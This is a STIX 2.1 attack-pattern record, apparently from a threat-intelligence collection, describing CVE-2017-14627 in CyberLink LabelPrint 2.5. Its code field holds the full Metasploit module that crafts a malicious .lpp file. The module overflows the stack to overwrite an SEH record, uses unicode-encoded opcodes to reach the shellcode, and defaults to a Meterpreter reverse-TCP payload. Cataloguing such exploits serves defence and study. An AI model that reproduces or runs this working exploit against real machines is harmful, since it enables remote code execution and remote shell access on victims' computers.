{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--83df5c1d-6d2d-443d-95e0-3a7d3610104d",
    "created": "2024-08-14T16:36:21.279457Z",
    "modified": "2024-08-14T16:36:21.279461Z",
    "name": "\"CyberLink LabelPrint 2.5 Stack Buffer Overflow\"",
    "description": " This module exploits a stack buffer overflow in CyberLink LabelPrint 2.5 and below. The vulnerability is triggered when opening a .lpp project file containing overly long string characters via open file menu. This results in overwriting a structured exception handler record and take over the application. This module has been tested on Windows 7 (64 bit), Windows 8.1 (64 bit), and Windows 10 (64 bit).  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/cyberlink_lpp_bof.rb",
            "external_id": "cyberlink_lpp_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-14627"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"CyberLink LabelPrint 2.5 Stack Buffer Overflow\",\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in CyberLink LabelPrint 2.5 and below.\n        The vulnerability is triggered when opening a .lpp project file containing overly long string characters\n        via open file menu. This results in overwriting a structured exception handler record and take over the\n        application. This module has been tested on Windows 7 (64 bit), Windows 8.1 (64 bit), and Windows 10 (64 bit).\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'modpr0be <tom@spentera.id>',       # initial discovery and metasploit module\n          'f3ci <marie@spentera.id>'          # unicode kungfu\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2017-14627' ],\n          [ 'EDB', '42777' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'FILENAME' => 'msf.lpp',\n          'EXITFUNC' => 'seh',\n          'DisablePayloadHandler' => true,\n          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          ['CyberLink LabelPrint <= 2.5 on Windows 7 (64 bit)',\n            {\n              'Ret' => \"\\x2c\\x44\",\n              'Offset' => 790,\n              'Padding1' => 857,\n              'Padding2' => 104\n            }\n          ],\n          ['CyberLink LabelPrint <= 2.5 on Windows 8.1 x64',\n            {\n              'Ret' => \"\\x2c\\x44\",\n              'Offset' => 790,\n              'Padding1' => 845,\n              'Padding2' => 116\n            }\n          ],\n          ['CyberLink LabelPrint <= 2.5 on Windows 10 x64 build 1803',\n            {\n              'Ret' => \"\\x2c\\x44\",\n              'Offset' => 790,\n              'Padding1' => 781,\n              'Padding2' => 180\n            }\n          ],\n        ],\n      'Payload'         =>\n        {\n          'Space'       => 15000,\n          'DisableNops' => true\n        },\n      'DisclosureDate'  => '2017-09-23',\n      'DefaultTarget'   => 0))\n  end\n\n  def get_payload(hunter)\n    enc = framework.encoders.create('x86/unicode_mixed')\n    enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })\n    hunter = enc.encode(hunter, nil, nil, platform)\n  end\n\n  def exploit\n    nop = \"\\x42\"\n    junk = 'ABC'.split('').sample              #junk must specifically static (A, B, and C only)\n    buffer = \"\"\n    buffer << junk * target['Offset']\n    buffer << \"\\x61\\x42\"       # nseh\n    buffer << target['Ret']    # seh\n\n    #we need to encode the RET address, since RET (\\xc3) is known as bad char.\n    #preparing address to land the decoded RET\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x54\"           #push esp\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x58\"           #pop eax\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x05\\x1B\\x01\"   #add eax 01001B00\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x2d\\x01\\x01\"   #sub eax 01001000\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x50\"           #push eax\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x5c\"           #pop esp\n\n    #preparing RET opcode (c300c300)\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x25\\x7e\\x7e\"   #and eax,7e007e00\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x25\\x01\\x01\"   #and eax,01000100\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x35\\x7f\\x7f\"   #xor eax,7f007f00\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x05\\x44\\x44\"   #add eax,44004400\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x57\"           #push edi as padding, needed to align stack\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x50\"           #push eax\n    buffer << junk * target['Padding1'] #OS specific\n\n    #custom venetian to reach shellcode\n    buffer << \"\\x58\"           #pop eax\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x58\"           #pop eax\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x05\\x09\\x01\"   #depending OS\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x2d\\x01\\x01\"   #add eax, 01000100, this will align eax to our buffer\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x50\"           #push eax\n    buffer << nop              #nop/inc edx\n\n    #crafting call esp at 0x7c32537b (MFC71U.dll) to make a jump using call esp\n    buffer << \"\\x5C\"           #pop esp\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x58\"           #pop eax\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x05\\x53\\x7c\"   #add eax 7c005300 part of call esp\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x50\"           #push eax\n    buffer << junk * target['Padding2'] #OS specific\n    buffer << \"\\x7b\\x32\"       #part of call esp\n\n    #preparing for jump to shellcode, placing in eax.\n    buffer << junk * 114       #junk\n    buffer << \"\\x57\"           #push edi\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x58\"           #pop eax\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x05\\x0A\\x01\"   #depending OS\n    buffer << nop              #nop/inc edx\n    buffer << \"\\x2d\\x01\\x01\"   #sub eax,01000100\n    buffer << nop              #nop/inc edx\n    buffer << get_payload(payload.encoded)\n    buffer << junk * (payload.space-buffer.length)      #fill the rest of buffer, must be added.\n\n    lpp_data = <<-EOS\n    <PROJECT version=\"1.0.00\">\n      <INFORMATION title=\"\" author=\"\" date=\"#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}\" SystemTime=\"#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}\">\n        <TRACK name=\"#{buffer}\" />\n      </INFORMATION>\n    </PROJECT>\n    EOS\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(lpp_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-23",
    "x_mitre_platforms": [
        "win'"
    ]
}